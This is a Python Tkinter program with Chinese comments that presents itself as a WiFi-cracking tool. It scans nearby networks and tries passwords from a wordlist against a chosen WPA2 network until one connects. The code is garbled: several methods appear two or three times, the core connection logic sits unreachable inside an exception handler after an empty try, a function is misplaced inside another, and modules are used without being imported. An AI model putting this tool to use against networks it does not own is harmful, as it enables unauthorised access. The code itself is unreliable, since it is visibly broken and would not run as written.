# coding:utf-8

from tkinter import *
from tkinter import ttk
import pywifi
from pywifi import const
import time
import tkinter.filedialog
import tkinter.messagebox
import threading
import queue
import concurrent.futures


class MY_GUI():
    def __init__(self, init_window_name):
        self.init_window_name = init_window_name
        self.lock = threading.Lock()  # 新增同步锁
        self.progress_var = DoubleVar()  # 新增进度条变量
        self.heartbeat = None  # 新增心跳计时器

        # 密码文件路径
        self.get_value = StringVar()

        # 获取破解wifi账号
        self.get_wifi_value = StringVar()

        # 获取wifi密码
        self.get_wifimm_value = StringVar()

        self.wifi = pywifi.PyWiFi()  # 抓取网卡接口
        try:
            self.iface = self.wifi.interfaces()[0]
        except IndexError:
            tkinter.messagebox.showerror("错误", "未找到可用无线网卡")
            sys.exit(1)
        self.iface.disconnect()  # 测试链接断开所有链接
        time.sleep(1)  # 休眠1秒
        # 测试网卡是否属于断开状态
        assert self.iface.status() in \
               [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
        self.stop_event = threading.Event()  # 新增停止事件
        self.thread_pool = []  # 线程池

    def readPassWord(self):
        self.stop_event.clear()
        self.getFilePath = self.get_value.get()
        self.get_wifissid = self.get_wifi_value.get()
        
        # 使用线程池优化线程管理
        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
            with open(self.getFilePath, "r", errors="ignore") as f:
                futures = [executor.submit(self.worker, pwd.strip()) for pwd in f]
                concurrent.futures.wait(futures, timeout=1)

    def worker(self, pwd):
        if self.stop_event.is_set():
            return
        if self.connect(pwd, self.get_wifissid):
            self.stop_event.set()
            self.get_wifimm_value.set(pwd)
            self.init_window_name.after(0, lambda: 
                tkinter.messagebox.showinfo('提示', '破解成功！！！'))

    def __str__(self):
        # 自动会调用的函数，返回自身的网卡
        return '(WIFI:%s,%s)' % (self.wifi, self.iface.name())

    # 设置窗口
    def set_init_window(self):
        self.init_window_name.title("WIFI破解工具")
        self.init_window_name.geometry('+500+200')

        labelframe = LabelFrame(width=400, height=200, text="配置")  # 框架，以下对象都是对于labelframe中添加的
        labelframe.grid(column=0, row=0, padx=10, pady=10)

        self.search = Button(labelframe, text="搜索附近WiFi", command=self.scans_wifi_list).grid(column=0, row=0)

        self.pojie = Button(labelframe, text="开始破解", command=self.readPassWord).grid(column=1, row=0)

        self.label = Label(labelframe, text="目录路径：").grid(column=0, row=1)

        self.path = Entry(labelframe, width=12, textvariable=self.get_value).grid(column=1, row=1)

        self.file = Button(labelframe, text="添加密码文件目录", command=self.add_mm_file).grid(column=2, row=1)

        self.wifi_text = Label(labelframe, text="WiFi账号：").grid(column=0, row=2)

        self.wifi_input = Entry(labelframe, width=12, textvariable=self.get_wifi_value).grid(column=1, row=2)

        self.wifi_mm_text = Label(labelframe, text="WiFi密码：").grid(column=2, row=2)

        self.wifi_mm_input = Entry(labelframe, width=10, textvariable=self.get_wifimm_value).grid(column=3, row=2,
                                                                                                  sticky=W)

        self.wifi_labelframe = LabelFrame(text="wifi列表")
        self.wifi_labelframe.grid(column=0, row=3, columnspan=4, sticky=NSEW)

        # 定义树形结构与滚动条
        self.wifi_tree = ttk.Treeview(self.wifi_labelframe, show="headings", columns=("a", "b", "c", "d"))
        self.vbar = ttk.Scrollbar(self.wifi_labelframe, orient=VERTICAL, command=self.wifi_tree.yview)
        self.wifi_tree.configure(yscrollcommand=self.vbar.set)

        # 表格的标题
        self.wifi_tree.column("a", width=45, anchor="center")
        self.wifi_tree.column("b", width=110, anchor="w")
        self.wifi_tree.column("c", width=120, anchor="w")
        self.wifi_tree.column("d", width=60, anchor="center")

        self.wifi_tree.heading("a", text="WiFiID")
        self.wifi_tree.heading("b", text="SSID")
        self.wifi_tree.heading("c", text="BSSID")
        self.wifi_tree.heading("d", text="signal")

        self.wifi_tree.grid(row=4, column=0, sticky=NSEW)
        self.wifi_tree.bind("<Double-1>", self.onDBClick)
        self.vbar.grid(row=4, column=1, sticky=NS)

    # 搜索wifi
    # cmd /k C:\Python27\python.exe "$(FULL_CURRENT_PATH)" & PAUSE & EXIT
    def scans_wifi_list(self):  # 扫描周围wifi列表
        # 开始扫描
        print("^_^ 开始扫描附近wifi...")
        self.iface.scan()
        time.sleep(1.5)
        # 在若干秒后获取扫描结果
        scanres = self.iface.scan_results()
        # 统计附近被发现的热点数量
        nums = len(scanres)
        print("数量: %s" % (nums))
        # print ("| %s |  %s |  %s | %s"%("WIFIID","SSID","BSSID","signal"))
        # 实际数据
        self.show_scans_wifi_list(scanres)
        return scanres

    # 显示wifi列表
    def show_scans_wifi_list(self, scans_res):
        for index, wifi_info in enumerate(scans_res):
            # print("%-*s| %s | %*s |%*s\n"%(20,index,wifi_info.ssid,wifi_info.bssid,,wifi_info.signal))
            self.wifi_tree.insert("", 'end', values=(index + 1, wifi_info.ssid, wifi_info.bssid, wifi_info.signal))
            # print("| %s | %s | %s | %s \n"%(index,wifi_info.ssid,wifi_info.bssid,wifi_info.signal))

    # 添加密码文件目录
    def add_mm_file(self):
        self.filename = tkinter.filedialog.askopenfilename()
        self.get_value.set(self.filename)

    # Treeview绑定事件
    def onDBClick(self, event):
        self.sels = event.widget.selection()
        self.get_wifi_value.set(self.wifi_tree.item(self.sels, "values")[1])
        # print("you clicked on",self.wifi_tree.item(self.sels,"values")[1])

    # 读取密码字典，进行匹配
    def readPassWord(self):
        # 动态设置线程数为CPU核心数的2倍
        thread_num = os.cpu_count() * 2 or 4
        self.stop_event.clear()
        self.getFilePath = self.get_value.get()
        self.get_wifissid = self.get_wifi_value.get()

        # 创建密码队列
        pwd_queue = queue.Queue()
        with open(self.getFilePath, "r", errors="ignore") as f:
            for pwd in f:
                pwd_queue.put(pwd.strip())

        # 创建并启动线程
        for _ in range(8):  # 8个线程
            thread = threading.Thread(target=self.worker, args=(pwd_queue,))
            thread.daemon = True
            thread.start()
            self.thread_pool.append(thread)

    def worker(self, pwd_queue):
        while not self.stop_event.is_set() and not pwd_queue.empty():
            try:
                pwd = pwd_queue.get_nowait()
                if self.connect(pwd, self.get_wifissid):
                    self.stop_event.set()
                    self.get_wifimm_value.set(pwd)
                    self.init_window_name.after(0, lambda: 
                        tkinter.messagebox.showinfo('提示', '破解成功！！！'))
                    print(f"===正确=== wifi名:{self.get_wifissid} 密码：{pwd}")
            except queue.Empty:
                break
            finally:
                pwd_queue.task_done()

    def __str__(self):
        # 自动会调用的函数，返回自身的网卡
        return '(WIFI:%s,%s)' % (self.wifi, self.iface.name())

    # 设置窗口
    def set_init_window(self):
        self.init_window_name.title("WIFI破解工具")
        self.init_window_name.geometry('+500+200')

        labelframe = LabelFrame(width=400, height=200, text="配置")  # 框架，以下对象都是对于labelframe中添加的
        labelframe.grid(column=0, row=0, padx=10, pady=10)

        self.search = Button(labelframe, text="搜索附近WiFi", command=self.scans_wifi_list).grid(column=0, row=0)

        self.pojie = Button(labelframe, text="开始破解", command=self.readPassWord).grid(column=1, row=0)

        self.label = Label(labelframe, text="目录路径：").grid(column=0, row=1)

        self.path = Entry(labelframe, width=12, textvariable=self.get_value).grid(column=1, row=1)

        self.file = Button(labelframe, text="添加密码文件目录", command=self.add_mm_file).grid(column=2, row=1)

        self.wifi_text = Label(labelframe, text="WiFi账号：").grid(column=0, row=2)

        self.wifi_input = Entry(labelframe, width=12, textvariable=self.get_wifi_value).grid(column=1, row=2)

        self.wifi_mm_text = Label(labelframe, text="WiFi密码：").grid(column=2, row=2)

        self.wifi_mm_input = Entry(labelframe, width=10, textvariable=self.get_wifimm_value).grid(column=3, row=2,
                                                                                                  sticky=W)

        self.wifi_labelframe = LabelFrame(text="wifi列表")
        self.wifi_labelframe.grid(column=0, row=3, columnspan=4, sticky=NSEW)

        # 定义树形结构与滚动条
        self.wifi_tree = ttk.Treeview(self.wifi_labelframe, show="headings", columns=("a", "b", "c", "d"))
        self.vbar = ttk.Scrollbar(self.wifi_labelframe, orient=VERTICAL, command=self.wifi_tree.yview)
        self.wifi_tree.configure(yscrollcommand=self.vbar.set)

        # 表格的标题
        self.wifi_tree.column("a", width=45, anchor="center")
        self.wifi_tree.column("b", width=110, anchor="w")
        self.wifi_tree.column("c", width=120, anchor="w")
        self.wifi_tree.column("d", width=60, anchor="center")

        self.wifi_tree.heading("a", text="WiFiID")
        self.wifi_tree.heading("b", text="SSID")
        self.wifi_tree.heading("c", text="BSSID")
        self.wifi_tree.heading("d", text="signal")

        self.wifi_tree.grid(row=4, column=0, sticky=NSEW)
        self.wifi_tree.bind("<Double-1>", self.onDBClick)
        self.vbar.grid(row=4, column=1, sticky=NS)

    # 搜索wifi
    # cmd /k C:\Python27\python.exe "$(FULL_CURRENT_PATH)" & PAUSE & EXIT
    def scans_wifi_list(self):  # 扫描周围wifi列表
        # 开始扫描
        print("^_^ 开始扫描附近wifi...")
        self.iface.scan()
        time.sleep(1.5)
        # 在若干秒后获取扫描结果
        scanres = self.iface.scan_results()
        # 统计附近被发现的热点数量
        nums = len(scanres)
        print("数量: %s" % (nums))
        # print ("| %s |  %s |  %s | %s"%("WIFIID","SSID","BSSID","signal"))
        # 实际数据
        self.show_scans_wifi_list(scanres)
        return scanres

    # 显示wifi列表
    def show_scans_wifi_list(self, scans_res):
        for index, wifi_info in enumerate(scans_res):
            # print("%-*s| %s | %*s |%*s\n"%(20,index,wifi_info.ssid,wifi_info.bssid,,wifi_info.signal))
            self.wifi_tree.insert("", 'end', values=(index + 1, wifi_info.ssid, wifi_info.bssid, wifi_info.signal))
            # print("| %s | %s | %s | %s \n"%(index,wifi_info.ssid,wifi_info.bssid,wifi_info.signal))

    # 添加密码文件目录
    def add_mm_file(self):
        self.filename = tkinter.filedialog.askopenfilename()
        self.get_value.set(self.filename)

    # Treeview绑定事件
    def onDBClick(self, event):
        self.sels = event.widget.selection()
        self.get_wifi_value.set(self.wifi_tree.item(self.sels, "values")[1])
        # print("you clicked on",self.wifi_tree.item(self.sels,"values")[1])

    # 读取密码字典，进行匹配
    def readPassWord(self):
        self.getFilePath = self.get_value.get()

        self.get_wifissid = self.get_wifi_value.get()

        pwdfilehander = open(self.getFilePath, "r", errors="ignore")
        i = 0
        while True:
            try:
                i = i + 1
                self.pwdStr = pwdfilehander.readline()

                if not self.pwdStr:
                    break
                self.bool1 = self.connect(self.pwdStr, self.get_wifissid)

                if self.bool1:
                    self.res = "===正确===  wifi名:%s 匹配第%s密码：%s " % (self.get_wifissid, i, self.pwdStr)
                    self.get_wifimm_value.set(self.pwdStr)
                    tkinter.messagebox.showinfo('提示', '破解成功！！！')
                    print(self.res)
                    break
                else:
                    self.res = "!错误! wifi名:%s匹配第%s密码：%s" % (self.get_wifissid, i, self.pwdStr)
                    print(self.res)
                # sleep(1)
            except:
                continue

    # 对wifi和密码进行匹配
    def connect(self, pwd_Str, wifi_ssid):
        with self.lock:
            try:
                pass  # 占位，等待后续异常处理逻辑添加
            except Exception as e:
                print(f"连接过程中出现异常: {e}")  # 简单打印异常信息，可根据实际情况修改处理逻辑
                # 重置网卡状态
                self.iface.disconnect()
                time.sleep(0.5)
                
                # 批量处理密码（每次处理5个）
                for _ in range(5):  # 批量尝试减少握手次数
                    self.iface.connect(self.tmp_profile)
                    start_time = time.time()
                    while time.time() - start_time < 2:  # 缩短等待时间至2秒
                        if self.iface.status() == const.IFACE_CONNECTED:
                            self.iface.disconnect()
                            return True
                        time.sleep(0.1)
                    return False
                    # 创建wifi链接文件
                    self.profile = pywifi.Profile()
                    self.profile.ssid = wifi_ssid  # wifi名称
                    self.profile.auth = const.AUTH_ALG_OPEN  # 网卡的开放
                    self.profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi加密算法
                    self.profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元
                    self.profile.key = pwd_Str  # 密码
                    self.iface.remove_all_network_profiles()  # 删除所有的wifi文件
                    self.tmp_profile = self.iface.add_network_profile(self.profile)  # 设定新的链接文件
                    self.iface.connect(self.tmp_profile)  # 链接
                    time.sleep(3)  # 3秒内能否连接上
                    if self.iface.status() == const.IFACE_CONNECTED:  # 判断是否连接上
                        isOK = True
                    else:
                        isOK = False
                    self.iface.disconnect()  # 断开
                    # time.sleep(1)
                    # 检查断开状态
                    assert self.iface.status() in \
                           [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
                    return isOK

    def __del__(self):
        # 安全停止所有线程
        self.stop_event.set()
        for t in self.thread_pool:
            t.join()


def gui_start():
    try:
        init_window = Tk()
        ui = MY_GUI(init_window)
        ui.set_init_window()
        init_window.mainloop()
    except Exception as e:
        print(f"程序异常: {str(e)}")
        input("按任意键退出...")

    def start_heartbeat(self):
        def check():
            if not self.stop_event.is_set():
                self.init_window_name.update()  # 强制刷新界面
                self.heartbeat = self.init_window_name.after(100, check)
        self.heartbeat = self.init_window_name.after(100, check)

gui_start()
